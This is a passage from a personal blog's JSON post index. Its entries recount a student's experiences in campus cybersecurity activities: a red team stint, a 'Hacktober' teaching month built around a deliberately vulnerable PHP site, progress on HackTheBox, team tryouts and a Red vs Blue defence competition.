team cover my back. The social engineering was also somewhat weird in it’s implementation. Anyone from red team as well as even the director of the event was able to attempt to get credentials through any means from the participants. Juggling so many tasks already on their plate while also not knowing how to react during a social engineering attempt only adds to their stress. Needless to say, it was pretty messy.Some Notable EventsSome notable events that are more live more in infamy than with pride: Event took place during the same time as CCDC Purpose of badges not explained Red team environment got reset Some team’s boxes got reset unintentionally Too many injectsHopefully we don’t run into this list again in the future. I learned my lesson from my first time time operating as a red teamer. I will be making sure not to repeat the mistakes on my end in the future." }, { "title": "Hacktober", "url": "/posts/Hacktober/", "categories": "Blog", "tags": "swift", "date": "2022-11-02 00:00:00 -0700", "snippet": "This past October, SWIFT has celebrated the National Cyber Security Awareness Month by hosting what we call Hacktober! So usually here at SWIFT, we teach all sorts of topics ranging from Windows/Linux security to the basics of the CI/CD pipeline. For October in particular, we focused solely on hacking hence the name, Hacktober. I even got to lead my first SWIFT workshop regarding web applications. Between the 4 weeks, the first 3 would be led by one of the CPP CPTC “Kill Squad” members teaching some topic. The final week capped off with a really cool event called “SCARE” or SWIFT’s Crack Attack Root Event.The Calm Before the StormI knew that Hacktober was coming up and I really enjoy teaching topics related to offensive security. This would be a great opportunity for me to spread the knowledge. The only issue is that I have not given a formal presentation in a few years so, here goes nothing, right? The next question was, “What do I want to teach?”. List of topics to cover over the month: Topic Learning Goals Environment Metasploit Teach the basics of metasploit as well as basic reconnaissance and enumeration. 1 Linux host serving 3 vulnerable services. Webapp Teach the basics of website enumeration, tools, and overall methodology. Also include basic injection techniques. 1 Linux hosting an intentionally vulnerable website. Active Directory Teach common windows privesc as well as common AD attacks. 1 Windows domain controller with common AD misconfigurations. I figured that Webapp week would most likely be the most fun for me to teach. It has some pretty interesting attacks you could play with and is, well hopefully, easy enough to teach to beginners as well.The Birth of JimCoinTo get started, I needed a basic web application to work with. A fellow colleague of mine provided me with his Computer Science class’ final project. The website was named RedemptionNFT which hosted a platform for people to buy, share, and list NFTs. The webapp was written in PHP which is convenient as PHP is known to be easily exploitable. So, I started developing the webapp.The webapp had some nice basic functionality but I wanted more. Taking some pages out of HackTheBox, I wanted to implement some common website vulnerabilities that I dealt with. Vulnerabilities such as: Vulnerability Summary SQL Injection An injection technique based on improper sanitization of user input used to craft malicious SQL queries. Local file inclusion Unsafe file handling leading to exposure of local files. Improper access controls You aren't supposed to be here. On top of these, I wanted to also teach the basic methodology of attacking a webapp so I included materials going over the usage of Burpsuite, gobuster, and so on.As the site was nearing it’s completion, I noticed that the default currency that was being used, Etherium, was not going to cut it. We need something new, something that really expresses us as a group. Enter, JimCoin. JimCoin is just a fake currency made up by us as a parody of one of our members. The original owner of the webapp created a subdomain for the site called “Jimmy Flips” where you can click a button to flip a picture of our friend to gain JimCoin. Using these coins, you can now purchase NFTs.Presentation of the MaterialWeek 1Our first week covered Metasploit. The leader of our Kill Squad members on the CPTC team led this presentation. He covered topics such as how to scan for vulnerabilities using Metasploit and how we can use it to our advantage. To be honest, I didn’t realize how powerful metasploit was until he put it on full display.Week 2Alright so this is my week. This week we went over the basics of web application penetration testing and boy was that s journey. I prepared roughly 40 slides of pure information and I’m sure I put people to sleep. It was a very informational presentation but I tried my best to explain the joys of high level web application penetration testing.Week 3This week we covered how to attack Active Directory led by our third member of the Kill Squad. It was around this time that involvement from SWIFT tended to cease which really hurt us. Between us 3, we had to effectively run a whole month worth of teaching material. We were pretty short staved to say the least. Creating slides, study guides, and presenting the material is a hassle. Regardless, I did my best to facilitate the teaching process each week.The SCAREThe SCARE is the conclusive event wrapping up Hacktober in a fun filled event. Each week we released an environment for the students to test the attacks we went over during each week and now, they get to see them all over again. The SCARE consists of 3 machines with the goal of each student attempting a penetration test on the boxes. The goal is to submit as many findings in detailed support tickets to the support desk to gain points. You get 100 points per foothold/privesc and 50 points per web vulnerability. We had a decent turnout of people but boy, only having 2 people man the support desk is stressful.Tickets began pouring in and piling up. I tried my absolute best to respond to everyone’s ticket in a thoughtful manner, but with the overwhelming amount of tickets being submitted, that would prove to be impossible. On the bright side, it is nice to see so many students excelling at the event as they find a handful of vulnerabilities to report.In the end, my mentee ended up winning the event by a large margin. The second place had roughly 2/3 the amount of points he did. But aside from winners and losers, the real takeaway of this event for everyone is knowledge. The people who stuck around from the beginning of the month to the end of the event, they all learned a significant deal about penetration testing.ConclusionOverall Hacktober was a success, but we can definitely use some improvements. First and foremost, I would’ve liked some more help from my peers as I did notice people taking a step back as the CPTC Kill Squad took over the month of teaching. We are only 3 people and we can only do so much. This put a lot of strain on us and phew was it stressful.Aside from those issues, this month in particular, I really enjoyed teaching people. During the workshops, the workshop lead would be teaching materials and going along while the other 2 helpers would go around and make sure everyone is on the same page. As I went around explaining details, I clearly remember seeing light bulbs pop up inside the students head as the fog cleared for them. Being able to visibly see students connect the dots is a very nice moment for me. I really enjoy teaching these people who have similar interests that I do. If anyone is curious and would like to view some of the development process into the web application, I have my notes here." }, { "title": "HackTheBox", "url": "/posts/HackTheBox/", "categories": "Blog", "tags": "htb", "date": "2022-10-15 00:00:00 -0700", "snippet": "HackTheBox, or HTB for short, is a website that I have used to develop a general penetration testing methodology. The platform provides you with multiple intentionally vulnerable hosts with the intent for you to compromise them. Each machine is effectively a long CTF where you embark on a journey to exploit vulnerabilities to gain flags hidden on the system. Every system provides you with a unique environment designed to expose you to different attack paths in order to teach you without being redundant from an older machine.Trust The ProcessMy time with HTB can be split into roughly 3 distinct periods. My first stint was cut off by an egregious addiction to Genshin Impact, severely hampering my progress into cyber security as a whole. Upon a wake up call in late February, I set off to continue my HTB journey in late April. This period continued until I went on a vacation with my family. Within a month, I came back and grinded for the title of “Pro Hacker”. Period Progression Dates Testing The Waters Completed 3-4 boxes. Each took an ungodly amount of time. Sep 13 - Nov 6 Taking Things Seriously Completed nearly 40 boxes over the course of a month and a half. Methodology refined. Apr 23 - Jul 26 The Push For Pro Hacker Completed a chain of active hard boxes. Took a considerable amount of time. Aug 29 - Sep 11 Testing The WatersThe very first box I took on went by the name “Cap”. The mascot was a pirate with a face seemingly saying “Arghh”. The box is aptly named cap due to the intended path involving p.CAP files as well as certain binary CAPabilities. Despite the box only requiring roughly 3 steps and the fastest completion time being roughly 5 minutes, it took me over 12 hours to complete. I admit my method for learning was not the greatest and I don’t recommend people to bash their head similarly to how I did, but its what I did to learn. I remember staring at my screen for several hours at a time searching up the most random things in attempt to move forward. Funny story, I remember searching up “Port 22 exploit” following an nmap scan as if it would help me. The first handful of boxes took me several hours to complete just a few steps. It was demoralizing I will admit. After 12 hours I looked back and realize how few things I have done. It’s painful, but that sound that plays when you submit the root flag, boy does that fuel me for days.Taking Things SeriouslyAfter completing a few boxes of the current rotation, I felt confident enough to purchase a VIP subscription. With this I am now able to access all of the old retired boxes. I tried my hand at several of the old easy and medium boxes and quickly realized that during my head-bashing sessions, I actually obtained a very primitive penetration testing methodology. These old boxes would be completed with ease. I would stay up nights trying to complete as many boxes as I could in a day. The sun peering through my window would by my signal to go to bed. 12+ hours would shrink to 1-3 hours for these quick and easy boxes and pretty soon, I realized, “I should aim for Pro Hacker”.The Push For Pro HackerHTB gives out titles based on completion of the current rotation of boxes. The issue is, there is no telling of how good or bad the quality of these boxes may be. However, having completed 40 boxes told me that I might be ready for the challenge. And so I started, one by one clearing all of the easy boxes. Took a bit but that was not too tough.Then came the medium boxes. I would spend a handful of hours across these boxes. One in particular I was not even able to compete. A box named “Retired” dealt with a buffer overflow in which I have no idea how to perform on a Linux system. Luckily for me, the box was retired (haha) and replaced by a much more reasonable “medium” box. Upon completing all of the easy and medium boxes, I only need 3 and a half more boxes to gain the elusive title. Issue is, only insane and hard boxes remain.Taking my brother’s advice, I decide not to even consider any of the insane boxes as those would put me through utter hell. That leaves only hard boxes left. I did some background research to complete the easier hard boxes and really, they were just longer versions of an easy or medium box. Not too bad. The two boxes left in my way were “Carpediem” and “Vessel”. These two boxes were rated pretty highly by the community. Accompanying the high ratings were also the high difficulty ratings. Long story short, I managed to overcome the both of them to gain my title of “Pro Hacker”. The cost? Only about 50 hours over the course of 2 weeks. I have detailed writeups on my notes which I will link at the bottom of the page if you are interested.Changing GearsAfter obtaining the title, a couple of my colleagues along with my brother convinced me to move on from the platform if I wanted to continue my learning. While it is true that I learned a lot from HTB, I was also becoming comfortable. I was performing different attacks on each machine however, my methods and tooling were always the same. If I want to improve technically, I need to start reading into how XYZ works or prepare for OSCP/CTRO. Regardless of what’s next, I need to get ready for CPTC. Western Regionals are coming up.What I Have LearnedHTB built my technical skills to where they are currently as of the time of writing. I first got started with these boxes back in August 2021 but did not actually take it seriously until about April 2022. Within the 5 months I’ve taken the platform seriously, I saw my box completion times drop from around 24h+ to around 2-4h depending on the length and difficulty of the machine. I remember spending hours trying to detect and perform a simple SQL injection on a website but now its part of standard procedure. Every challenge along the way slowly became integrated into my bag of tools to toss at a lock in the future.One of my greatest takeaways from HTB is the importance of debugging. What really separates a lethal penetration tester from an average one is, in my opinion, their debugging skills. It’s one thing to be technically sound and know the ins and outs of an attack vector but that does not scale well in the grand scheme of things. Being able to use your current knowledge to adapt and overcome challenges through debugging the source of error within your method is much more important.I can recall a handful of times where I have gotten stuck at some wall where I am unfamiliar with the intended attack path only for my younger brother to swoop in and give it a shot. Despite me having full context of the environment up until that point, my younger brother can debug my source of error and solve the issue with lightning speed. I vividly remember him complaining at how bad my keyboard is as he stumbled across which keys he wanted to press. As I stare at the console, I can hardly keep up with his commands and barely understand what is going on. When I concentrate hard enough, I can see that he is trying to understand at what point is the attempt failing and what other options does he have? 95% of the time this process eventually leads to success and opens the path further into the environment. In short, debugging is a critical skill to have and the better you are with it, the more well off you are.How I Use HackTheBox NowadaysRecently I have moved away from HTB to focus more on other projects or competitions that I’m gearing up for (CPTC and RvB!). HTB is great for learning technical skills however it somewhat caused me to develop tunnel vision. HTB’s environments tend to have one answer and the unintended paths tend to appear from the age of the machine or are some crazy high level find that I wont ever reach. Instead of treating HTB as if it was a realistic environment, I now use it as more of a sandbox. Setting up my own home lab can be tedious so why not use publicly available ones to test attacks instead? It is a trade off customizability for convenience. One of these days I’ll set up my own home lab as that alone will teach myself plenty of things but for now I’ll be using the “prebuilt” environments on HTB instead. No longer is HTB a puzzle or game where I would derive a sense of accomplishment by figuring out the intended attack path, but rather I use it to learn about why certain attack vectors work at a deeper level. It’s fun to test new tools on machines rather than going in blindly to figure something out after several hours of head-bashing.My Personal NotesI’ve taken down the posts that were originally on this site. As I realized, the more boxes I do the more I’ll flood this page up. Instead I have decided to publicly host my notes on Notion instead and link it here. Also if anyone is interested in my cracked younger brother and what he is up to, check out his blog. Some pretty crazy stuff." }, { "title": "CPP Cyber Bootcamps 2022", "url": "/posts/CPPCyberBootcamps2022/", "categories": "Blog", "tags": "cptc, ccdc, competitions", "date": "2022-08-27 00:00:00 -0700", "snippet": "CPP Cyber is the competition team here at California State Polytechnic University, Pomona. Only skilled individuals are allowed to make it onto the team and CPP Cyber helps you with that by hosting these rigorous bootcamps to teach you the skills necessary to join the team. I have participated in the bootcamp in the year prior however, I did not take it seriously and paid the consequences by not making it onto either of the teams. This year, I decided to change that and make at least one of the teams.The bootcamp is marketed to be beginner friendly but to be honest, it isn’t really. The bootcamps are quite difficult and require you to go above and beyond outside of the allocated training times. This bootcamp is not for the faint of heart.Prior to the SummerShortly after ITC and RvB took place on the same day back in April, my schedule was clear to study up for the bootcamps. I am very inexperienced when it comes to the field of cyber, but I have a keen interest in it. Most of the people on either of the teams have several years of experience. Heck even some of the people are working in the industry already. Meanwhile there’s me, barely managed to exit VIM a few weeks ago. I have a lot to do if I want to make any of the teams.HTB ArcI’ll keep things short so that I do not have to repeat myself so much from my upcoming blog post however, here is the short version. CPTC was my main priority so immediately I set out to get started in my hacking journey. I have primarily used a platform called HackTheBox. Their website contains multiple environments that are vulnerable so that players such as me can attempt to fully compromise the system. By the time the tryouts for the CPTC came around, I had completed just under 40 boxes. I would like to think that after all of that, I am slightly prepared for what’s next to say the least.I’m currently working on another blog post regarding my HTB journey so give that a read if you get the change to. I plan to fully flesh out my experience with HTB when I reach a nice ending point, so to speak.Bootcamp Officially StartsLuckily for us this year, the bootcamp was held in-person along with a hybrid component for our online zoom buddies. Bootcamp was held every Saturday from, if I recall correctly, 10am-4pm. 10am - 12pm was the time slot for CPTC and 1pm-4pm was for CCDC. I showed up in person every single week that I could and gave it my absolute all. In contrast to the previous year, I would actually pay attention to the presenters and not sleep. The only issue was that for CPTC, I already knew roughly 75% of the material that they were teaching. Another issue was that once CCDC started, I was solely focused on doing CPTC homework. CCDC topics were interesting but the homework was nothing short of brutal. Giving beginners one week to set up Wordpress on IIS among other hellish tasks is a crime. Many tears were shed while trying to manually set up PHP for the first time. Not mine of course.I had to cut the bootcamp short due to a family vacation. I missed most of the material from week 4-6 and my grades reflected that. Upon returning, my body was still in vacation mode and I was just on cruise control all the way until the tryouts. A little bit unfortunate but hey, I had my fun.The TryoutsCPTCCPTC tryouts were the first of the pair to roll around and boy was I more than ready. Prior to the tryout, I ran through the previous year’s environment and pwned it completely, from the inside out. Last year when I tried out, I’d say I completed about less than 10% of it. To say the least, I was extremely confident on the day of the tryout. The moment it began, I performed an nmap ping sweep to identify 3 hosts. I quickly pull up tmux and split into 3 new windows each with 2 separate panes. One pane was for a quick full port scan while the other was for a service version and script scan. Within 5 minutes I already had my targets fully scanned. Within 1 hour, the Linux host was already compromised. Within the next hour both hosts have fallen. By the time I moved onto the third, I realized I made a fatal error. To replicate the infamous port 502, modbus for typical ICS software, the dev team made the final box purposefully fragile. My “-sVC” scan tore it down and rendered it inaccessible. That’s a big whoops!The following day I went down to a friend’s house to have dinner. Needless to say, my report was not shaping up. When I got home, my fingers never left my keyboard. I wrote everything down as fast as I could, modeling my report after RIT’s 2020 global report. In the end, I got the highest report score of 77.5/100 clearing the second place score of 62. Most people got in the 20s-30s. The standouts got 50+. The scoring team was pretty brutal. But that is only half the journey, CCDC is next.CCDCAs for the more prestigious competition, you would think that I would try to take more care for it, but I was quite burnt out by then. Riding off my high of the results from CPTC tryouts, I couldn’t really care less for CCDC. I kind of just winged it. This past RvB, a competition hosted by SWIFT modeled after CCDC, a fellow competitor and I managed to get first place. As a team of 2 edging out every other team of 4, we were pretty well set off. Going into the tryouts, I fumbled the bag, HARD.There were some bumps during the tryouts such as I didn’t actually know my team number until half way into the competition. All the services that I thought was up was not actually up. I wasn’t in the top 10, I was straight up in the bottom 10. By the end of the scoring checks, I wasn’t even in the top half of the competitors. I utteraly flunked it.Since my younger brother was already on the CCDC team and one of the scorers, I was slightly eavesdropping on his room to get the results prematurely. I heard them say something along the lines of: “Oh he isn’t doing too well. Oh shit, his service points aren’t great at all, he’s not going to make it. Wait, put in the inject scores, let’s see. Oh? WAIT HE’S GONNA MAKE IT!? Put in the homework scores quick! Oh wait nevermind he’s out of the race.” My carelessness on the CCDC homework cost me my spot on the team. Oops! I’ll redeem myself next year.Looking ForwardAll in all, the bootcamp was an amazing experience. Getting to see my fellow competitors aiming for a spot on the team sitting side by side with me in the room was quite fun. Really got my blood boiling from all the excitement. The next major milestone in my journey now is the CPTC Western Regionals in November. Look forward to that post after CPTC is all said and done." }, { "title": "RvB Spring 2022", "url": "/posts/RvBSpring2022/", "categories": "Blog", "tags": "swift, competitions, rvb", "date": "2022-04-18 00:00:00 -0700", "snippet": "Red versus Blue, more commonly referred to as RvB, is an event held by SWIFT every semester. During this competition, you, the player, can sign up with up to 3 other people to form a squad of 4. With your squad, you are given a network of X amount of boxes to secure and defend as an active red team attempts to break in and take down your services. Meanwhile all of this chaos is brewing, the manager of the event is also handing out tasks called injects. It’s pretty fun and I recommend people to take part in it if they ever get the chance.Team CompositionEntering RvB, I wanted to win first place. This was not my first rodeo and I wanted that first place spot. I’m fairly familiar with the competition as I’ve gotten the chance to participate in the Fall 2021 RvB along with 2 other mini rounds during preparation for NCAE. So here’s about how much thought I put into the team composition: Zero Looking back I should have been more careful when trying to put together a championship roster. The team I put together was pretty much just running it back with some of the people who I managed to reach out to first from NCAE. For the sake of anonymity, no names will be dropped.First one up on the block is my buddy I’ve been running things with for a bit now. He and I got our start into security at roughly the same time and through previous RvBs, hes always had my back. He covered the spots I’ve left open. He’s probably the teammate I trust the most since the beginning.Second person showed interest in learning, but when the competition rolled around, did not end up doing anything really. They got caught up with some technical issues and ended up watching what me and my partner were doing in an attempt to learn.The third teammate was just MIA the entire time. I’ve attempted to contact him multiple times, all of which were in vain. Nice.The team composition ended up looking a bit like: Team Member Role Responsibilities Me Captain Team oversight + Windows and business J Ops Team Linux security W Spectator Nothing A Bro was missing Nothing The PreparationAs much as I wanted to win, the fact that ITC, another competition, took place on the same day as RvB. Since I was more familiar with RvB, I dedicated most of my time up until that point into the other competition. I sort of winged RvB when it really comes down to it. All I really had were a few rudimentary checklists to follow. Regardless, I was confident enough when we entered the competition.The StrategyThe plan was pretty simple, do the basic defenses and just camp the leaderboard. As a team of two, its better to focus on the short-term solutions as long-term ones require too much attention and dedication. The competition went on for about only 5 hours which is not that long relative to CCDC so we would be better off in the short-term. Change passwords, firewall, set up an antivirus, and disable useless services. That’s all we really planned to do.The ShowdownAs we take our seats in the back of the room, the event coordinator, Abe Woz takes the podium. He gives us a speech regarding the state of the factory and how he is aware of an APT group planning an attack and that it was up to us to defend their network. Towards the end of the speech, he gets an emergency call and screams to us that we are under attack, signaling to us that that is our cue to begin the event.Immediately my partner and I divide up the work. He gets the 3 Linux boxes and I get the 3 Windows boxes. We did have a router that was also in scope but none of us knew how to configure a pfSense router so we just sat back and prayed nothing would happen to it. I secured the basics of my first windows box within 20 minutes as they were all just low hanging fruit. I had to rush since one of us needed to work on the business task that was assigned to us. My duo worked tirelessly and quickly to secure the remaining linux boxes.By the time I submitted the first inventory report, I had realized that none of us went up to do the presentation, costing us a severe loss in points. Too many tasks to juggle between just the 2 of us caused us to get lost in the sea of tasks. Regardless of the outcome, I continued working on my next task of the audit report.Snippet of the audit reportWhile working on the business side of things my partner noticed that after all that, we were barely outside of the top 3 in the event. With the high quality of our injects, I knew we actually stood a chance of winning the competition. Every time we saw one of our services go down, we would immediately try to trace the root cause of the issue and bring back up our service as soon as possible. Due to our quick reactions, we eventually cracked the top 3 in terms of service points.Some time during the event, we failed to notice that one of the red teamers swung by and stealthily took a picture of our screens. My partner conveniently had a text file with all of our passwords to the environment on it. The red teamer came by 30 minutes later and teased us in a roundabout way by asking these super specific questions about our password as he inched closer and closer to it with each subsequent question. It was a pretty funny moment when he revealed the pictures he had taken of us.The ResultsThe awards ceremony announced the teams who did best by category before moving onto the overall winner of the event. The 3 categories went as follows: Most Inject Points Most Service Points Most Overall Points (The Winner)The team that got the most inject points.. was not us. I was surprised as I was quite confident that our reports were really well made. The team that got the most service points was also not us. Things aren’t looking too great right now. My doubts were quickly suppressed as to my surprise, our team did win the most overall points.Despite only having a team of two members, we managed to defeat every other team of 4 in the event. A pretty nice crowning achievement if I do say so myself." } ]
